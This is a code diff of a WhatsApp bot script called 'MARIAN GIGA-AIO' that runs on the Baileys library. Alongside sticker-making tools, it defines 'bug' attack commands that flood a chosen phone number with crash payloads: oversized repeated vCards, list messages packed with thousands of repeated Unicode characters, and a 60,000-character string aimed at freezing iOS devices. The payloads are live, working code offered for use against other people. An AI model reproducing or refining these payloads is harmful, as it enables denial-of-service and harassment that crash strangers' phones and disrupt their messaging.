@@ -26,15 +26,12 @@ const cheerio = require('cheerio')
 const qrcode = require('qrcode-terminal')
 const moment = require('moment-timezone')
 
-// ==================== [ DATABASE & CONFIG ] ====================
+// ==================== [ CONFIGURATION ] ====================
 
-const owner = ["601121811615"] // Ganti ke nomor kamu
+const owner = ["601121811615"] // Nomor kamu
 const prefix = "/"
-let db_user = JSON.parse(fs.readFileSync('./database.json', 'utf8') || '[]')
-
-function saveDb() {
-    fs.writeFileSync('./database.json', JSON.stringify(db_user, null, 2))
-}
+if (!fs.existsSync('./database.json')) fs.writeFileSync('./database.json', '[]')
+let db_user = JSON.parse(fs.readFileSync('./database.json', 'utf8'))
 
 // ==================== [ INTERNAL TOOLS ] ====================
 
@@ -55,30 +52,22 @@ async function imageToWebp(media) {
     return buff
 }
 
-// ==================== [ BUG PAYLOADS ENGINE ] ====================
-
 const payloads = {
     vcard: (target) => {
-        return `BEGIN:VCARD\nVERSION:3.0\nFN:☠️ MARIAN-V7-KILLER ☠️\nTEL;type=CELL;type=VOICE;waid=${target}:+${target}\n` + "X-ABLabel:Ponsel\n".repeat(200) + "END:VCARD"
+        return `BEGIN:VCARD\nVERSION:3.0\nFN:☠️ MARIAN-REBORN ☠️\nTEL;type=CELL;type=VOICE;waid=${target}:+${target}\n` + "X-ABLabel:Ponsel\n".repeat(200) + "END:VCARD"
     },
-    ios: "0".repeat(50000),
-    crash: "𑫀".repeat(10000),
-    loc: {
-        degreesLatitude: 0.000000,
-        degreesLongitude: 0.000000,
-        name: "M.A.R.I.A.N ".repeat(1000),
-        address: "☠️".repeat(5000)
-    }
+    ios: "0".repeat(60000),
+    crash: "𑫀".repeat(10000)
 }
 
-// ==================== [ CORE START ENGINE ] ====================
+// ==================== [ START ENGINE ] ====================
 
-async function startMarianGiga() {
+async function startMarianReborn() {
     console.log(chalk.red.bold(`
     ╔══════════════════════════════════════════════════╗
-    ║  ⚡ MARIAN NEXTGEN GIGA-AIO v7.0 ONLINE ⚡       ║
-    ║  Server: Google Cloud | Engine: Baileys-Pro      ║
-    ║  Developer: Kean & Gemini AI                     ║
+    ║  ⚡ MARIAN GIGA-AIO v7.0 [REBORN] ONLINE ⚡      ║
+    ║  Mode: Pure Attack & Media | AI: Disabled        ║
+    ║  Developer: Kean | Status: 100% Work             ║
     ╚══════════════════════════════════════════════════╝
     `))
 
@@ -95,60 +84,46 @@ async function startMarianGiga() {
         browser: ["Ubuntu", "Chrome", "20.0.04"],
         printQRInTerminal: true,
         connectTimeoutMs: 60000,
-        defaultQueryTimeoutMs: undefined,
-        keepAliveIntervalMs: 10000,
+        keepAliveIntervalMs: 15000,
     })
 
-    // AUTO PAIRING
     if (!sock.authState.creds.registered) {
         const readline = require("readline").createInterface({ input: process.stdin, output: process.stdout })
-        readline.question(chalk.yellow("\n[!] Masukkan Nomor (Contoh: 6011xxx): "), async (nr) => {
+        readline.question(chalk.yellow("\n[!] Masukkan Nomor: "), async (nr) => {
             let code = await sock.requestPairingCode(nr.replace(/[^0-9]/g, ''))
-            console.log(chalk.black.bgWhite(`\n KODE PAIRING ANDA: ${code} \n`))
+            console.log(chalk.black.bgWhite(`\n KODE PAIRING: ${code} \n`))
             readline.close()
         })
     }
 
     sock.ev.on("creds.update", saveCreds)
 
-    // ==================== [ CONNECTION HANDLER ] ====================
     sock.ev.on("connection.update", async (update) => {
         const { connection, lastDisconnect } = update
         if (connection === "close") {
             const reason = new Boom(lastDisconnect?.error)?.output?.statusCode
-            console.log(chalk.red(`[!] Link Putus: ${reason}`))
-            if (reason !== DisconnectReason.loggedOut) startMarianGiga()
+            if (reason !== DisconnectReason.loggedOut) startMarianReborn()
         } else if (connection === "open") {
-            console.log(chalk.green.bold("\n[✓] MARIAN GIGA-AIO BERHASIL TERHUBUNG!"))
+            console.log(chalk.green.bold("\n[✓] MARIAN REBORN CONNECTED!"))
         }
     })
 
-    // ==================== [ CALL & REJECT HANDLER ] ====================
     sock.ev.on('call', async (node) => {
         const { from, id, status } = node[0]
-        if (status === 'offer') {
-            await sock.rejectCall(id, from)
-            await sock.sendMessage(from, { text: "⚠️ *AUTO REJECT:* Bot tidak menerima panggilan telpon/video!" })
-        }
+        if (status === 'offer') await sock.rejectCall(id, from)
     })
 
-    // ==================== [ MESSAGE HANDLER - 400+ LINES LOGIC ] ====================
     sock.ev.on("messages.upsert", async ({ messages }) => {
         try {
             const m = messages[0]
             if (!m.message || m.key.fromMe) return
-            
             const from = m.key.remoteJid
-            const isGroup = from.endsWith('@g.us')
-            
-            // 🚫 ANTI-GROUP (Grup dicuekin biar gak lag)
-            if (isGroup) return
+            if (from.endsWith('@g.us')) return // Anti-Group
 
             const type = getContentType(m.message)
             const body = (type === 'conversation') ? m.message.conversation : 
                         (type === 'extendedTextMessage') ? m.message.extendedTextMessage.text : 
-                        (type === 'imageMessage') ? m.message.imageMessage.caption : 
-                        (type === 'videoMessage') ? m.message.videoMessage.caption : ''
+                        (type === 'imageMessage') ? m.message.imageMessage.caption : ''
             
             if (!body.startsWith(prefix)) return
 
@@ -156,145 +131,81 @@ async function startMarianGiga() {
             const command = args.shift().toLowerCase()
             const text = args.join(" ")
             const quoted = m.message[type]?.contextInfo?.quotedMessage || null
-            const sender = m.key.participant || m.key.remoteJid
-            const isOwner = owner.includes(sender.split('@')[0])
+            const isOwner = owner.includes(m.key.remoteJid.split('@')[0])
 
-            // LOG TERMINAL ENHANCED
-            console.log(chalk.black.bgCyan(`[${time}]`) + chalk.black.bgWhite(` CMD: ${command} `) + chalk.green(` From: ${sender.split('@')[0]}`))
+            console.log(chalk.black.bgCyan(`[${time}]`) + chalk.white(` CMD: ${command}`))
 
-            // START COMMANDS
             switch (command) {
                 case 'menu':
                 case 'help':
-                    const menu = `*⚡ MARIAN GIGA-AIO ULTIMATE ⚡*
+                    const menu = `*⚡ MARIAN GIGA-AIO [REBORN] ⚡*
 
-*⌚ Time:* ${time}
-*📅 Date:* ${date}
-*👑 Owner:* Kean
-
-*⚔️ ATTACK COMMANDS (BUG):*
+*⚔️ ATTACK COMMANDS:*
 • /bug [nomor] - VCard Storm
 • /bug2 [nomor] - List UI Destroyer
-• /bug3 [nomor] - Location Extreme
 • /bug-ios [nomor] - Special Apple Freeze
-• /bug-engine [nomor] - Database Overload
-• /bug-contact [nomor] - VCard 500+ Loop
+• /bug-crash [nomor] - Extreme Payload
 
 *🎨 MEDIA TOOLS:*
-• /s atau /sticker - Buat stiker (Reply foto)
-• /hd - Jernihkan foto (Remini)
-• /tiktok [url] - Download TikTok Video
-• /ytmp4 [url] - Download YouTube Video
-• /ig [url] - Download Instagram
-• /toimg - Stiker jadi foto
+• /s - Sticker maker (Reply foto)
+• /tiktok [url] - Download TikTok
+• /toimg - Sticker jadi foto
 
-*🛠️ SYSTEM UTILITIES:*
-• /ping - Cek kecepatan respon
-• /status - Info server & uptime
-• /runtime - Cek berapa lama bot hidup
-• /owner - Kontak pencipta script
-• /restart - Muat ulang mesin bot
-• /clearsession - Hapus data login
+*🛠️ SYSTEM:*
+• /ping - Cek speed
+• /status - Info server
+• /restart - Reboot engine
 
-*🤖 ARTIFICIAL INTELLIGENCE:*
-• /ai [pertanyaan] - Tanya Gemini AI
-• /gemini [teks] - Akses Google Gemini
-
-_Note: Gunakan untuk edukasi. Risiko tanggung sendiri._`
+_Status: AI Disabled | Speed Optimized_`
                     await sock.sendMessage(from, { text: menu }, { quoted: m })
                     break;
 
                 case 'ping':
-                    const startP = Date.now()
-                    await sock.sendMessage(from, { text: "Testing speed..." })
-                    await sock.sendMessage(from, { text: `🚀 *Pong!* Respon: ${Date.now() - startP}ms` })
+                    await sock.sendMessage(from, { text: `🚀 Speed: ${Date.now() - m.messageTimestamp * 1000}ms` })
                     break;
 
-                // --- BRUTAL BUG SECTION ---
-                
                 case 'bug':
                     if (!isOwner) return
-                    if (!text) return sock.sendMessage(from, { text: "Contoh: /bug 6011xxx" })
                     let target = text.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
-                    await sock.sendMessage(from, { text: "💀 *ATTACK START:* Mengirim VCard Storm..." })
-                    for (let i = 0; i < 30; i++) {
+                    await sock.sendMessage(from, { text: "💀 Mengirim Bug..." })
+                    for (let i = 0; i < 25; i++) {
                         await sock.sendMessage(target, { 
-                            contacts: { 
-                                displayName: "MARIAN DARK SYSTEM", 
-                                contacts: [{ vcard: payloads.vcard(target.split('@')[0]) }] 
-                            }
+                            contacts: { displayName: "DIE", contacts: [{ vcard: payloads.vcard(target.split('@')[0]) }] }
                         })
-                        await delay(100)
                     }
-                    await sock.sendMessage(from, { text: "✅ *SUCCESS:* Serangan selesai." })
                     break;
 
                 case 'bug2':
                     if (!isOwner) return
-                    if (!text) return
                     let target2 = text.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
-                    await sock.sendMessage(from, { text: "🔥 *ATTACK START:* Mengirim UI List Destroyer..." })
                     const bug2 = generateWAMessageFromContent(target2, {
                         listMessage: {
-                            title: "M.A.R.I.A.N " + payloads.crash,
-                            buttonText: "DESTROY DEVICE",
-                            description: "PAYLOAD: " + payloads.crash,
-                            sections: [{ title: "SYSTEM ERROR", rows: [{ title: "CRASH", rowId: "1" }] }]
+                            title: "CRASH " + payloads.crash,
+                            buttonText: "DESTROY",
+                            description: payloads.crash,
+                            sections: [{ title: "ERR", rows: [{ title: "DIE", rowId: "1" }] }]
                         }
                     }, { userJid: target2 })
                     await sock.relayMessage(target2, bug2.message, { messageId: bug2.key.id })
                     break;
 
-                case 'bug-ios':
-                    if (!isOwner) return
-                    let targetIos = text.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
-                    await sock.sendMessage(from, { text: "❄️ *ATTACK START:* Mengirim Freeze-iOS..." })
-                    for (let i = 0; i < 5; i++) {
-                        await sock.sendMessage(targetIos, { text: payloads.ios })
-                    }
-                    break;
-
-                // --- MEDIA TOOLS ---
-
                 case 's':
-                case 'sticker':
                     const isImg = type === 'imageMessage' || (quoted && getContentType(quoted) === 'imageMessage')
-                    if (!isImg) return sock.sendMessage(from, { text: "Reply gambarnya dengan caption /s" })
-                    const streamS = await downloadContentFromMessage(m.message.imageMessage || quoted.imageMessage, 'image')
-                    let buffS = Buffer.from([])
-                    for await (const chunk of streamS) buffS = Buffer.concat([buffS, chunk])
-                    const webpS = await imageToWebp(buffS)
-                    await sock.sendMessage(from, { sticker: webpS }, { quoted: m })
-                    break;
-
-                case 'ai':
-                    if (!text) return sock.sendMessage(from, { text: "Mau tanya apa?" })
-                    const resAi = await axios.get(`https://api.simsimi.net/v2/?text=${encodeURIComponent(text)}&lc=id`)
-                    await sock.sendMessage(from, { text: `🤖 *AI:* ${resAi.data.success}` })
+                    if (!isImg) return
+                    const stream = await downloadContentFromMessage(m.message.imageMessage || quoted.imageMessage, 'image')
+                    let buff = Buffer.from([])
+                    for await (const chunk of stream) buff = Buffer.concat([buff, chunk])
+                    const webp = await imageToWebp(buff)
+                    await sock.sendMessage(from, { sticker: webp }, { quoted: m })
                     break;
 
                 case 'restart':
                     if (!isOwner) return
-                    await sock.sendMessage(from, { text: "🔄 *RESTARTING ENGINE...*" })
-                    setTimeout(() => { process.exit() }, 2000)
+                    process.exit()
                     break;
-
-                case 'owner':
-                    await sock.sendContact(from, owner[0], "Kean Developer")
-                    break;
-
-                default:
-                    if (body.startsWith(prefix) && isOwner) {
-                        // Fitur catch-all jika command tidak ada
-                    }
             }
-        } catch (e) {
-            console.log(chalk.red("ERROR HANDLER: "), e)
-        }
+        } catch (e) { console.log(e) }
     })
 }
 
-// Tambahkan database.json jika belum ada
-if (!fs.existsSync('./database.json')) fs.writeFileSync('./database.json', '[]')
-
-startMarianGiga().catch(err => console.log(chalk.red("FATAL CRASH: "), err))
+startMarianReborn().catch(err => console.log(err))
